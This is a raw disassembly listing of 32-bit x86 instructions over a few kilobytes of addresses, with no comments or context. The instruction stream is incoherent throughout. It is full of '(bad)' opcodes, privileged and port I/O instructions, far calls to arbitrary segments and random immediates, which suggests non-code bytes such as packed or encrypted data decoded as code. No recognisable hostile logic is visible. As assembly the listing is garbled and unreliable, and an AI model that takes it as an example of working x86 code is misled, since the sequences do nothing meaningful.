  42d725:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d726:	sub    DWORD PTR [ecx-0x225f918a],eax
  42d72c:	cwde   
  42d72d:	jne    0x42d712
  42d72f:	dec    edi
  42d730:	mov    dh,0x6a
  42d732:	es cld 
  42d734:	mov    cl,BYTE PTR [ecx+0x5a]
  42d737:	test   eax,0xa7ac5e67
  42d73c:	sbb    eax,0xe107d64d
  42d741:	sbb    ecx,DWORD PTR ds:0xf9fcb55a
  42d747:	rcr    DWORD PTR [eax],1
  42d749:	lods   eax,DWORD PTR ds:[esi]
  42d74a:	pop    edx
  42d74b:	cld    
  42d74c:	mov    dh,0x89
  42d74e:	aaa    
  42d74f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d750:	jg     0x42d74c
  42d752:	fisubr DWORD PTR [edi]
  42d754:	pop    eax
  42d755:	je     0x42d6e1
  42d757:	inc    ecx
  42d758:	mov    dl,0x91
  42d75a:	ror    BYTE PTR [edi+eiz*2-0x7459dcf],cl
  42d761:	xor    edi,DWORD PTR [eax]
  42d763:	and    BYTE PTR [edx+0x2db6bfb1],dh
  42d769:	je     0x42d75b
  42d76b:	daa    
  42d76c:	mov    DWORD PTR [edx+0x64c82709],eax
  42d772:	mov    BYTE PTR [ecx-0x58ea4b0f],dh
  42d778:	mov    ebp,0x8a70dcc4
  42d77d:	mov    edx,DWORD PTR [edx+0x4]
  42d780:	mov    ch,0x62
  42d782:	icebp  
  42d783:	bound  ebp,QWORD PTR [esp+edx*8+0x2726b2e]
  42d78a:	xchg   esi,eax
  42d78b:	ret    
  42d78c:	push   esi
  42d78d:	adc    al,0xb6
  42d78f:	jnp    0x42d7a1
  42d791:	mov    dh,al
  42d793:	adc    al,0x2c
  42d795:	push   es
  42d796:	outs   dx,BYTE PTR ds:[esi]
  42d797:	es cs jg 0x42d753
  42d79b:	pop    edi
  42d79c:	xchg   ebx,eax
  42d79d:	jecxz  0x42d739
  42d79f:	mov    ebx,0xab63cdef
  42d7a4:	dec    eax
  42d7a5:	or     DWORD PTR [esi],0xffffffa7
  42d7a8:	call   0x6db1cb08
  42d7ad:	cmp    BYTE PTR [eax+0xe],cl
  42d7b0:	mov    dl,0x26
  42d7b2:	pop    ds
  42d7b3:	mov    cl,0xf9
  42d7b5:	lock rcl DWORD PTR [esi+0x77],cl
  42d7b9:	or     edi,DWORD PTR [edx+0x7f13c1e8]
  42d7bf:	jae    0x42d836
  42d7c1:	mov    bh,0xca
  42d7c3:	sub    esi,DWORD PTR [ebx+ebp*2]
  42d7c6:	call   0xe0df:0x303fbd9b
  42d7cd:	test   edi,ebx
  42d7cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d7d0:	cmp    ah,ah
  42d7d2:	cdq    
  42d7d3:	add    edx,DWORD PTR [edi-0x3c29c6e3]
  42d7d9:	lods   al,BYTE PTR ds:[esi]
  42d7da:	nop
  42d7db:	sahf   
  42d7dc:	pop    eax
  42d7dd:	add    ebp,DWORD PTR [edi]
  42d7df:	jb     0x42d793
  42d7e1:	popf   
  42d7e2:	ficom  DWORD PTR [edi-0x586e5afc]
  42d7e8:	daa    
  42d7e9:	jg     0x42d839
  42d7eb:	pop    cx
  42d7ed:	call   0xd727:0x41b21332
  42d7f4:	imul   ecx,DWORD PTR [ebx+0xe],0x50
  42d7f8:	pop    ss
  42d7f9:	jnp    0x42d852
  42d7fb:	mov    cl,0x47
  42d7fd:	stos   BYTE PTR es:[edi],al
  42d7fe:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42d800:	ins    DWORD PTR es:[edi],dx
  42d801:	popf   
  42d802:	paddw  mm7,QWORD PTR [esi+0x5d]
  42d806:	call   0x67f2:0x7ba35cd0
  42d80d:	sub    bh,dl
  42d80f:	test   eax,0x63d139eb
  42d814:	dec    esi
  42d815:	into   
  42d816:	adc    ebx,ecx
  42d818:	enter  0x9bcb,0xfa
  42d81c:	outs   dx,DWORD PTR ds:[esi]
  42d81d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d81e:	mov    eax,ds:0xe50b4be6
  42d823:	cwde   
  42d824:	push   ecx
  42d825:	cmp    ah,ah
  42d827:	test   DWORD PTR [edi],ecx
  42d829:	or     cl,ch
  42d82b:	adc    DWORD PTR [ebp+0x6ac16aea],edx
  42d831:	mov    ch,0xfb
  42d833:	int3   
  42d834:	mov    WORD PTR [esi],gs
  42d836:	inc    esp
  42d837:	daa    
  42d838:	daa    
  42d839:	dec    ecx
  42d83a:	sub    BYTE PTR ds:0xa7d05289,0xe2
  42d841:	rol    DWORD PTR [edi-0x52c96fc6],1
  42d847:	pusha  
  42d848:	mov    dl,0x59
  42d84a:	pop    edx
  42d84b:	mov    ebx,0xae585831
  42d850:	pop    ecx
  42d851:	add    eax,0x3e08dd60
  42d856:	lock mov al,0x7e
  42d859:	or     ebp,DWORD PTR [edx]
  42d85b:	ror    DWORD PTR [edx],0x7e
  42d85e:	es scas eax,DWORD PTR es:[edi]
  42d860:	mov    bh,0x2e
  42d862:	int3   
  42d863:	hlt    
  42d864:	xor    eax,0x7c4b1a14
  42d869:	lock and eax,0xf6c89997
  42d86f:	push   ebx
  42d870:	aam    0x3a
  42d872:	retf   0x2615
  42d875:	ror    BYTE PTR ds:[edx],cl
  42d878:	test   DWORD PTR [edi+ecx*4],ecx
  42d87b:	pop    ecx
  42d87c:	push   eax
  42d87d:	push   ecx
  42d87e:	push   0xffffffe8
  42d880:	inc    esi
  42d881:	les    eax,FWORD PTR [ebp+0x4c34e7a7]
  42d887:	pmulhw mm4,QWORD PTR [esi+0x4d]
  42d88b:	ss mov bl,0x7d
  42d88e:	rcr    DWORD PTR [ecx-0x5c],1
  42d891:	enter  0xf19b,0x7a
  42d895:	pop    edi
  42d896:	mov    esp,0x8e4716a9
  42d89b:	std    
  42d89c:	repnz fdiv DWORD PTR ds:0x9b6205ed
  42d8a3:	cmp    BYTE PTR [ebp-0x3ada173b],0xa6
  42d8aa:	stos   BYTE PTR es:[edi],al
  42d8ab:	jo     0x42d8b4
  42d8ad:	or     esi,DWORD PTR [ecx-0x15e955da]
  42d8b3:	iret   
  42d8b4:	sbb    BYTE PTR [ecx],0x9a
  42d8b7:	loope  0x42d899
  42d8b9:	push   esi
  42d8ba:	jno    0x42d880
  42d8bc:	in     al,dx
  42d8bd:	jge    0x42d888
  42d8bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d8c0:	inc    ebx
  42d8c1:	or     ch,BYTE PTR [eax]
  42d8c3:	jl     0x42d901
  42d8c5:	lods   eax,DWORD PTR ds:[esi]
  42d8c6:	cmp    eax,0x9ba65caf
  42d8cb:	inc    ebx
  42d8cc:	out    0xfb,eax
  42d8ce:	xchg   DWORD PTR [edi+0x58ea1f26],ecx
  42d8d4:	mov    al,0xb
  42d8d6:	mov    cl,0x38
  42d8d8:	push   ss
  42d8d9:	aaa    
  42d8da:	sub    BYTE PTR [ebp+0x45],bl
  42d8dd:	(bad)  
  42d8de:	call   0xf4ac:0x72a4df55
  42d8e5:	daa    
  42d8e6:	pop    esp
  42d8e7:	pop    ebp
  42d8e8:	aam    0xb
  42d8ea:	mov    ebp,0x4aaaf9ee
  42d8ef:	or     eax,0xf49ea8f2
  42d8f4:	call   0x33019f32
  42d8f9:	jle    0x42d922
  42d8fb:	xchg   edi,eax
  42d8fc:	fild   QWORD PTR ds:0xb502f89
  42d902:	scas   al,BYTE PTR es:[edi]
  42d903:	pushf  
  42d904:	hlt    
  42d905:	bound  ebx,QWORD PTR [edi+0x60]
  42d908:	lods   al,BYTE PTR ds:[esi]
  42d909:	cld    
  42d90a:	inc    edi
  42d90b:	nop
  42d90c:	std    
  42d90d:	jae    0x42d976
  42d90f:	xchg   DWORD PTR [edi+0x1897c610],esi
  42d915:	or     esi,DWORD PTR [esi]
  42d917:	pop    ss
  42d918:	(bad)  
  42d919:	cs in  al,dx
  42d91b:	cmp    esi,DWORD PTR ds:0xfbe59aff
  42d921:	loope  0x42d914
  42d923:	push   ebp
  42d924:	dec    ebx
  42d925:	repz int 0xa0
  42d928:	repnz dec ebp
  42d92a:	xchg   esp,eax
  42d92b:	inc    ebp
  42d92c:	push   esi
  42d92d:	jnp    0x42d97a
  42d92f:	and    al,0x4c
  42d931:	pop    ss
  42d932:	cdq    
  42d933:	inc    edx
  42d934:	test   BYTE PTR [esi],al
  42d936:	ja     0x42d9a7
  42d938:	outs   dx,DWORD PTR ds:[esi]
  42d939:	lods   al,BYTE PTR ds:[esi]
  42d93a:	call   0x25d4:0x95e2d29c
  42d941:	or     ecx,DWORD PTR [ecx]
  42d943:	mov    ebx,0xdbde55b3
  42d948:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d949:	ficomp WORD PTR [edx-0x38298f12]
  42d94f:	jne    0x42d8e5
  42d951:	mov    esi,0x7cfaa5dd
  42d956:	pop    ds
  42d957:	cmp    al,ah
  42d959:	add    eax,edi
  42d95b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d95c:	sbb    BYTE PTR cs:[edx-0x6],0xcd
  42d961:	add    al,0x2d
  42d963:	dec    eax
  42d964:	std    
  42d965:	jne    0x42d9c1
  42d967:	cmc    
  42d968:	je     0x42d9d7
  42d96a:	fstp   DWORD PTR [ebp-0x43]
  42d96d:	push   ss
  42d96e:	jns    0x42d90a
  42d970:	iret   
  42d971:	sub    esp,DWORD PTR [edx]
  42d973:	inc    edi
  42d974:	inc    ebp
  42d975:	or     DWORD PTR [ebp+0x41],0x10
  42d979:	or     esi,eax
  42d97b:	pop    ecx
  42d97c:	ret    
  42d97d:	add    al,0x3e
  42d97f:	je     0x42d90d
  42d981:	xchg   esp,eax
  42d982:	in     eax,dx
  42d983:	mov    bh,0x58
  42d985:	inc    ebx
  42d986:	call   0x5d44:0xb3f77c65
  42d98d:	mov    ebp,0xcab7a4b8
  42d992:	xchg   ch,cl
  42d994:	jmp    0xb5c44ae
  42d999:	shl    DWORD PTR [ebx],cl
  42d99b:	aad    0xb2
  42d99d:	stos   DWORD PTR es:[edi],eax
  42d99e:	mov    ecx,0x1985d27e
  42d9a3:	push   edi
  42d9a4:	inc    ebx
  42d9a5:	or     eax,DWORD PTR [edx+0x7a]
  42d9a8:	push   edx
  42d9a9:	sub    eax,0x9e76c475
  42d9ae:	call   0x882b:0xf69251a2
  42d9b5:	cmp    DWORD PTR [edi-0x7be90857],0x73
  42d9bc:	repnz pop ss
  42d9be:	sub    dh,BYTE PTR [esi-0x6e657a9c]
  42d9c4:	jb     0x42d970
  42d9c6:	dec    eax
  42d9c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d9c8:	inc    esp
  42d9c9:	iret   
  42d9ca:	dec    edx
  42d9cb:	fadd   DWORD PTR [edx-0x4]
  42d9ce:	push   esi
  42d9cf:	xor    cl,BYTE PTR [edx]
  42d9d1:	add    eax,0x1a492896
  42d9d6:	call   0xb2f4:0x56bffa95
  42d9dd:	adc    al,0x0
  42d9df:	call   0xa5f3616f
  42d9e4:	out    dx,eax
  42d9e5:	xor    DWORD PTR [ebx+ebp*8+0x1897e432],esp
  42d9ec:	aad    0x3c
  42d9ee:	ins    DWORD PTR es:[edi],dx
  42d9ef:	sbb    dh,BYTE PTR [edx-0x5ae2b843]
  42d9f5:	fisubr DWORD PTR [ebp+eax*1-0x588c1629]
  42d9fc:	fcom   st(5)
  42d9fe:	push   0x9e098863
  42da03:	sbb    esi,DWORD PTR [ebx+0x7182e76f]
  42da09:	jae    0x42d9b3
  42da0b:	push   es
  42da0c:	dec    ebp
  42da0d:	xchg   ebx,eax
  42da0e:	inc    esp
  42da0f:	test   al,0xf4
  42da11:	or     edi,DWORD PTR [edx+0x6f80b9c6]
  42da17:	xor    eax,0x459997fd
  42da1c:	or     BYTE PTR [ebx-0x17fdacb6],al
  42da22:	pushf  
  42da23:	pop    ds
  42da24:	clc    
  42da25:	jb     0x42d9f9
  42da27:	test   al,0x9b
  42da29:	outs   dx,DWORD PTR ds:[esi]
  42da2a:	sub    eax,0x611b92d8
  42da2f:	mov    esi,0x6a9a138a
  42da34:	out    dx,eax
  42da35:	rcr    DWORD PTR [ecx-0x4203855d],cl
  42da3b:	popf   
  42da3c:	popf   
  42da3d:	xor    al,0x1a
  42da3f:	lds    bx,DWORD PTR [esi-0x4aa3b40b]
  42da46:	ins    BYTE PTR es:[edi],dx
  42da47:	ret    0x10b2
  42da4a:	out    dx,al
  42da4b:	mov    eax,ds:0x9af1bb2a
  42da50:	xor    ecx,DWORD PTR [ebx]
  42da52:	xchg   BYTE PTR ds:0x5e254c46,ch
  42da58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42da59:	(bad)  
  42da5a:	cdq    
  42da5b:	pop    es
  42da5c:	neg    DWORD PTR [ebx]
  42da5e:	cmp    eax,0x99fb2f1f
  42da63:	movsx  ecx,WORD PTR [ebx]
  42da66:	nop
  42da67:	test   BYTE PTR ds:0xa4aeb349,0xa9
  42da6e:	call   0xc68:0x5a313532
  42da75:	aaa    
  42da76:	jne    0x42da18
  42da78:	icebp  
  42da79:	sub    DWORD PTR [esi],esp
  42da7b:	bound  esp,QWORD PTR [eax-0x78c12ed5]
  42da81:	addr16 call 0x10a6:0x4147f8f
  42da89:	int3   
  42da8a:	cmc    
  42da8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da8c:	inc    edi
  42da8d:	sar    DWORD PTR [ebx],0xf0
  42da90:	jl     0x42da6b
  42da92:	or     esp,DWORD PTR [ecx]
  42da94:	mov    dl,0xe6
  42da96:	into   
  42da97:	pop    edx
  42da98:	or     eax,0x4a452e4e
  42da9d:	or     eax,DWORD PTR [ebp+0x15]
  42daa0:	mov    edx,esi
  42daa2:	add    eax,0x9a1faae7
  42daa7:	aad    0x51
  42daa9:	fwait
  42daaa:	idiv   BYTE PTR [ecx]
  42daac:	les    ebp,FWORD PTR [edx]
  42daae:	mov    dl,0xa7
  42dab0:	jmp    0x42da34
  42dab2:	(bad)  
  42dab3:	jo     0x42dae2
  42dab5:	lods   eax,DWORD PTR ds:[esi]
  42dab6:	idiv   DWORD PTR [ebx-0x4e]
  42dab9:	in     eax,dx
  42daba:	nop
  42dabb:	cmp    bl,BYTE PTR [ebp-0x1b56c258]
  42dac1:	or     eax,DWORD PTR [edx-0x3d]
  42dac4:	mov    esi,0xfda6e3f4
  42dac9:	pop    edx
  42daca:	sub    al,BYTE PTR [edi+ebp*4+0x6f650f7e]
  42dad1:	mov    WORD PTR [edx+0x3f],ds
  42dad4:	aaa    
  42dad5:	jp     0x42db16
  42dad7:	out    0x87,al
  42dad9:	or     esi,DWORD PTR [edi+0x21]
  42dadc:	xor    bl,BYTE PTR [ebp+0x6c63742f]
  42dae2:	call   0x6e7c:0x9f35a884
  42dae9:	push   ebx
  42daea:	push   edi
  42daeb:	pop    ss
  42daec:	bound  ecx,QWORD PTR [edx+eiz*8]
  42daef:	mov    ecx,0x5669258e
  42daf4:	fldcw  WORD PTR [eax+0x5f3a4fd1]
  42dafa:	mov    esp,0x956331b2
  42daff:	bound  esi,QWORD PTR [esi]
  42db01:	in     al,dx
  42db02:	jo     0x42db30
  42db04:	std    
  42db05:	(bad)  
  42db06:	sahf   
  42db07:	jmp    0xb9f:0x8133d772
  42db0e:	lds    ebp,FWORD PTR [eax+0x647c49fa]
  42db14:	jg     0x42db70
  42db16:	call   0x3c51:0x519c8baf
  42db1d:	ret    
  42db1e:	jecxz  0x42dac7
  42db20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42db21:	fiadd  WORD PTR [eax-0x24]
  42db24:	mov    ah,0x87
  42db26:	sbb    al,0x7f
  42db28:	mov    dl,0x18
  42db2a:	ret    0x189d
  42db2d:	call   0xbcd860b
  42db32:	dec    ebx
  42db33:	test   dh,ch
  42db35:	test   eax,0x5eb03ce9
  42db3a:	call   0xd90d:0xf9111e46
  42db41:	mov    ch,0x52
  42db43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42db44:	push   ss
  42db45:	jns    0x42dbad
  42db47:	mov    edx,DWORD PTR [eax-0x6f]
  42db4a:	and    DWORD PTR [edx],0xffffffee
  42db4d:	(bad)  
  42db4e:	cdq    
  42db4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42db50:	pop    edi
  42db51:	mov    ds:0xcc5746ca,eax
  42db56:	shl    BYTE PTR [edi+0x76ef5888],1
  42db5c:	jl     0x42dae5
  42db5e:	aad    0x9
  42db60:	lods   al,BYTE PTR ds:[esi]
  42db61:	mov    edi,0x74726ef9
  42db66:	outs   dx,BYTE PTR ds:[esi]
  42db67:	xlat   BYTE PTR ds:[ebx]
  42db68:	mov    cl,0xe7
  42db6a:	mov    ebx,DWORD PTR [ebx+0x3a]
  42db6d:	adc    eax,0xb303ba5
  42db72:	sub    bl,ah
  42db74:	adc    eax,0xb380c7a3
  42db79:	or     DWORD PTR [edi-0x77],eax
  42db7c:	dec    edi
  42db7d:	push   es
  42db7e:	or     esi,DWORD PTR [eax+0x46]
  42db81:	ret    
  42db82:	adc    al,0xa7
  42db84:	mov    edx,0x3fc9dcaa
  42db89:	pop    ebx
  42db8a:	xchg   esi,eax
  42db8b:	or     dh,BYTE PTR [edx+0x5e47bbd]
  42db91:	out    0x7f,al
  42db93:	cmp    DWORD PTR [edx+0xb],eax
  42db96:	sbb    al,BYTE PTR [ecx+0x0]
  42db99:	in     al,dx
  42db9a:	xor    eax,edx
  42db9c:	xchg   ebx,eax
  42db9d:	(bad)  
  42db9e:	call   0x585a:0x5caf0fd7
  42dba5:	push   esi
  42dba6:	mov    al,ds:0x9fc224a7
  42dbab:	in     eax,0x5e
  42dbad:	xchg   esi,eax
  42dbae:	je     0x42db55
  42dbb0:	mov    dl,0xa4
  42dbb2:	or     BYTE PTR [ecx+0x21],bh
  42dbb5:	mov    eax,?
  42dbb7:	sbb    al,0x48
  42dbb9:	or     ebx,edi
  42dbbb:	in     al,dx
  42dbbc:	mov    cl,0x28
  42dbbe:	add    BYTE PTR [edx+0x4f9aa9a9],cl
  42dbc4:	or     bh,BYTE PTR [edi-0x51843596]
  42dbca:	jne    0x42db70
  42dbcc:	and    eax,DWORD PTR [ebx]
  42dbce:	fsub   DWORD PTR [ebx+0x675ea309]
  42dbd4:	das    
  42dbd5:	sub    esp,DWORD PTR es:[edx-0x4e]
  42dbd9:	test   eax,0xc7eaecd9
  42dbde:	xchg   esi,eax
  42dbdf:	shr    BYTE PTR [ebx-0x29763d9],0x27
  42dbe6:	jnp    0x42db8f
  42dbe8:	ins    DWORD PTR es:[edi],dx
  42dbe9:	sar    DWORD PTR ds:0x9a6d1170,0x34
  42dbf0:	or     eax,0xf7fca823
  42dbf5:	clc    
  42dbf6:	nop
  42dbf7:	mov    al,ds:0xf1442d35
  42dbfc:	cmc    
  42dbfd:	fwait
  42dbfe:	jmp    0x9afba8d2
  42dc03:	xor    edx,esp
  42dc05:	hlt    
  42dc06:	scas   eax,DWORD PTR es:[edi]
  42dc07:	pop    ebp
  42dc08:	imul   BYTE PTR [ecx]
  42dc0a:	push   ecx
  42dc0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc0c:	and    BYTE PTR [edx+0x77367d42],bh
  42dc12:	repnz aaa 
  42dc14:	mov    dl,0x8d
  42dc16:	cmp    edx,esp
  42dc18:	test   edi,esp
  42dc1a:	sub    BYTE PTR ds:0xa7c3edb0,bl
  42dc20:	sbb    al,0x20
  42dc22:	or     DWORD PTR [ecx],edx
  42dc24:	dec    edx
  42dc25:	lahf   
  42dc26:	out    dx,eax
  42dc27:	(bad)  
  42dc28:	stos   DWORD PTR es:[edi],eax
  42dc29:	je     0x42dc7e
  42dc2b:	adc    esi,DWORD PTR [edi+ebx*8]
  42dc2e:	bound  ecx,QWORD PTR [esi-0x45]
  42dc31:	or     BYTE PTR [edx-0x17],cl
  42dc34:	fcom   DWORD PTR [ebp+0x2802812d]
  42dc3a:	mov    ds:0xa3ae5026,eax
  42dc3f:	mov    al,0x80
  42dc41:	aaa    
  42dc42:	scas   al,BYTE PTR es:[edi]
  42dc43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc44:	or     edx,DWORD PTR [ebp+ebx*1-0x11e79fd5]
  42dc4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc4c:	dec    ebx
  42dc4d:	iret   
  42dc4e:	mov    esp,0xfa99908b
  42dc53:	ins    DWORD PTR es:[edi],dx
  42dc54:	test   al,0xd6
  42dc56:	mov    ds:0xf908d253,eax
  42dc5b:	imul   ecx,DWORD PTR [ebp-0x4ac86de6],0x75a7edb2
  42dc65:	cmp    BYTE PTR [edx+0x6],dh
  42dc68:	pop    ebp
  42dc69:	popa   
  42dc6a:	mov    ebx,0x7a9eb234
  42dc6f:	mov    ebx,0x351ea31d
  42dc74:	sbb    ecx,DWORD PTR [ebx]
  42dc76:	xor    ah,0xf0
  42dc79:	jg     0x42dc40
  42dc7b:	sar    DWORD PTR [ebx+ebx*1-0x66],1
  42dc7f:	adc    DWORD PTR [ebp+edx*2-0x3fc1232f],ebp
  42dc86:	aas    
  42dc87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc88:	pop    edi
  42dc89:	mov    dl,0x36
  42dc8b:	pusha  
  42dc8c:	xchg   BYTE PTR [ecx+0x6d],al
  42dc8f:	push   edx
  42dc90:	mov    dl,0x61
  42dc92:	push   edi
  42dc93:	fwait
  42dc94:	std    
  42dc95:	scas   eax,DWORD PTR es:[edi]
  42dc96:	sbb    eax,0xeb0b1522
  42dc9b:	lods   al,BYTE PTR ds:[esi]
  42dc9c:	mov    ds:0xa9f68096,eax
  42dca1:	rcr    DWORD PTR [eax+0x60d7227],cl
  42dca7:	jecxz  0x42dc47
  42dca9:	jmp    0x42dd0d
  42dcab:	pop    esi
  42dcac:	push   edi
  42dcad:	or     ebp,DWORD PTR [ecx+0xc]
  42dcb0:	push   esp
  42dcb1:	idiv   DWORD PTR [ecx-0x65ea7f38]
  42dcb7:	cmp    BYTE PTR [edi+0x3bdfb057],bh
  42dcbd:	mov    ds:0x8fa1a2eb,eax
  42dcc2:	or     ecx,ecx
  42dcc4:	push   cs
  42dcc5:	or     eax,DWORD PTR [eax-0x27]
  42dcc8:	into   
  42dcc9:	sbb    DWORD PTR [edi],edx
  42dccb:	mov    ebp,0x571d8b2
  42dcd0:	xchg   ebp,eax
  42dcd1:	imul   edx,DWORD PTR ds:0x6c0b4c1f,0xffffffbb
  42dcd8:	add    esi,DWORD PTR [eax-0x671212f5]
  42dcde:	call   0x917b:0xeff0f34f
  42dce5:	xchg   ebx,eax
  42dce6:	xchg   esp,eax
  42dce7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dce8:	leave  
  42dce9:	pop    ecx
  42dceb:	mov    eax,0x7eb665f5
  42dcf0:	mov    WORD PTR [eax+0x6bf927ca],?
  42dcf6:	cmp    ch,BYTE PTR [edx-0x58d70039]
  42dcfc:	shl    BYTE PTR [edx],0xdc
  42dcff:	(bad)  
  42dd00:	sbb    al,0x8e
  42dd02:	popf   
  42dd03:	div    BYTE PTR [edx-0x158307cf]
  42dd09:	or     eax,0xa443259
  42dd0e:	sbb    ecx,DWORD PTR [esi-0x6369e70d]
  42dd14:	mov    ebx,fs
  42dd16:	mov    al,BYTE PTR [edi-0x564b134e]
  42dd1c:	adc    DWORD PTR [ebx+edx*4+0x2e],ebp
  42dd20:	or     cl,BYTE PTR [ebx]
  42dd22:	ror    ecx,cl
  42dd24:	jecxz  0x42dcde
  42dd26:	mov    al,0x7a
  42dd28:	fisttp DWORD PTR [edx]
  42dd2a:	call   0x7140:0x40d7b4e
  42dd31:	xor    DWORD PTR [edx],ebp
  42dd33:	test   eax,0x9a839c53
  42dd38:	xchg   edx,eax
  42dd39:	add    al,0x77
  42dd3b:	xchg   BYTE PTR [esi+0x5a809b01],al
  42dd41:	pop    ss
  42dd42:	jl     0x42dd96
  42dd44:	aaa    
  42dd45:	lds    edi,FWORD PTR [eax-0xe]
  42dd48:	repnz pusha 
  42dd4a:	pop    ebp
  42dd4b:	jno    0x42dd11
  42dd4d:	arpl   WORD PTR [edx+0xcfa28b3],bx
  42dd53:	ss pop esi
  42dd55:	in     al,0xe0
  42dd57:	mov    al,ds:0xc8a44dec
  42dd5c:	das    
  42dd5d:	sti    
  42dd5e:	xchg   ebx,eax
  42dd5f:	rcl    ch,cl
  42dd61:	add    eax,0x9222a29a
  42dd66:	ss fdivr st(7),st
  42dd69:	add    DWORD PTR [edi-0x4bd02059],ebp
  42dd6f:	dec    edx
  42dd70:	or     al,0x77
  42dd72:	push   ebx
  42dd73:	addr16 mov bl,0x52
  42dd76:	pop    ss
  42dd77:	dec    esp
  42dd78:	outs   dx,BYTE PTR ds:[si]
  42dd7a:	bound  ebx,QWORD PTR [ecx-0x74afc46e]
  42dd80:	jl     0x42dd2e
  42dd82:	jae    0x42dd2b
  42dd84:	stos   BYTE PTR es:[edi],al
  42dd85:	jno    0x42dd97
  42dd87:	loope  0x42ddb1
  42dd89:	jl     0x42dd24
  42dd8b:	mov    ecx,0x5c5c8440
  42dd90:	and    al,0xbd
  42dd93:	das    
  42dd94:	xchg   edx,eax
  42dd95:	xor    ecx,DWORD PTR [ecx-0x59]
  42dd98:	ins    DWORD PTR es:[edi],dx
  42dd99:	(bad)  
  42dd9a:	into   
  42dd9b:	sbb    al,0xa0
  42dd9d:	rcr    ch,cl
  42dd9f:	into   
  42dda0:	out    dx,al
  42dda1:	(bad)  
  42dda2:	int3   
  42dda3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dda4:	jo     0x42dd3f
  42dda6:	(bad)  
  42dda7:	mov    ds:0x125aaa62,eax
  42ddac:	or     BYTE PTR [di+0x550c],dh
  42ddb1:	repnz test BYTE PTR [edx+edi*1-0x48],bh
  42ddb6:	add    BYTE PTR [edi],0xb3
  42ddb9:	jl     0x42dda4
  42ddbb:	pushf  
  42ddbc:	ss call 0x5acecb5
  42ddc2:	les    esp,FWORD PTR [edi-0x38cdf0a0]
  42ddc8:	cmp    edx,DWORD PTR [edi]
  42ddca:	ss inc ebx
  42ddcc:	mov    ch,0x45
  42ddce:	fbstp  TBYTE PTR [ebx+0x1859df0f]
  42ddd4:	(bad)  
  42ddd5:	cwde   
  42ddd6:	xchg   ebx,eax
  42ddd7:	setne  BYTE PTR [edi+eiz*8-0x25de859]
  42dddf:	sub    eax,DWORD PTR [ebp+0x46]
  42dde2:	retf   
  42dde3:	(bad)  
  42dde4:	mov    dl,0x2a
  42dde6:	mov    ds:0xab29db09,al
  42ddeb:	loope  0x42de36
  42dded:	or     esp,DWORD PTR [ecx-0x1b965556]
  42ddf3:	push   ebp
  42ddf4:	cdq    
  42ddf5:	mov    ebx,0x7eb57e9a
  42ddfa:	dec    edi
  42ddfb:	add    eax,0xb19e22ef
  42de00:	mov    esi,0xf6b9252b
  42de05:	mov    al,0x1a
  42de07:	inc    ebx
  42de08:	inc    ebx
  42de09:	xchg   ebp,eax
  42de0a:	call   0x9b333dda
  42de0f:	pop    es
  42de10:	cli    
  42de11:	inc    eax
  42de12:	sti    
  42de13:	push   edx
  42de14:	ins    BYTE PTR es:[edi],dx
  42de15:	pop    esp
  42de16:	cld    
  42de17:	mov    ecx,0x273927a4
  42de1c:	out    0x9b,eax
  42de1e:	retf   0x35ae
  42de21:	icebp  
  42de22:	fwait
  42de23:	adc    eax,0x847b366
  42de28:	imul   ebx,DWORD PTR [ebx],0xbff4956
  42de2e:	imul   ecx,DWORD PTR [ecx+0x38446355],0xffa51a5a
  42de38:	test   BYTE PTR [ebx-0x10335d20],0x47
  42de3f:	mov    ds:0x115c0bc3,eax
  42de44:	sbb    BYTE PTR [esi+0x622bfa1c],ah
  42de4a:	js     0x42de49
  42de4c:	mov    dl,0xab
  42de4e:	sub    bl,BYTE PTR [ebp-0x5a9c843f]
  42de54:	loope  0x42de61
  42de56:	mov    ah,BYTE PTR [ebx]
  42de58:	fsub   QWORD PTR [ebp-0x478008e6]
  42de5e:	cdq    
  42de5f:	pop    ebp
  42de60:	xchg   ecx,eax
  42de61:	dec    ecx
  42de62:	push   esp
  42de63:	popf   
  42de64:	push   es
  42de65:	stos   DWORD PTR es:[edi],eax
  42de66:	pop    ebx
  42de67:	mov    eax,DWORD PTR [esi*8+0x7184a7d9]
  42de6e:	loop   0x42dead
  42de70:	arpl   WORD PTR [ebp-0x664d637a],cx
  42de76:	iret   
  42de77:	mov    ah,0x51
  42de79:	add    ch,BYTE PTR ds:0x7a079a79
  42de7f:	dec    esi
  42de80:	xchg   ebp,eax
  42de81:	adc    al,0xea
  42de83:	int    0xb2
  42de85:	push   0xffffffed
  42de87:	daa    
  42de88:	push   0x1b
  42de8a:	retf   0xdf41
  42de8d:	js     0x42df08
  42de8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42de90:	mov    al,0x64
  42de92:	or     al,0xa6
  42de94:	cld    
  42de95:	lods   eax,DWORD PTR ds:[esi]
  42de96:	out    0x10,al
  42de98:	pop    esp
  42de99:	jmp    DWORD PTR [edi+0x710b87d9]
  42de9f:	mov    eax,ds:0xb61c73a4
  42dea4:	jno    0x42deb1
  42dea6:	(bad)  
  42dea7:	mov    dl,0x79
  42dea9:	xor    BYTE PTR [edx-0x654400bc],bh
  42deaf:	xchg   ebx,eax
  42deb0:	pop    esp
  42deb1:	sbb    BYTE PTR [ebp+0x73],cl
  42deb4:	je     0x42de6e
  42deb6:	mov    esp,0xab9385a8
  42debb:	pop    esi
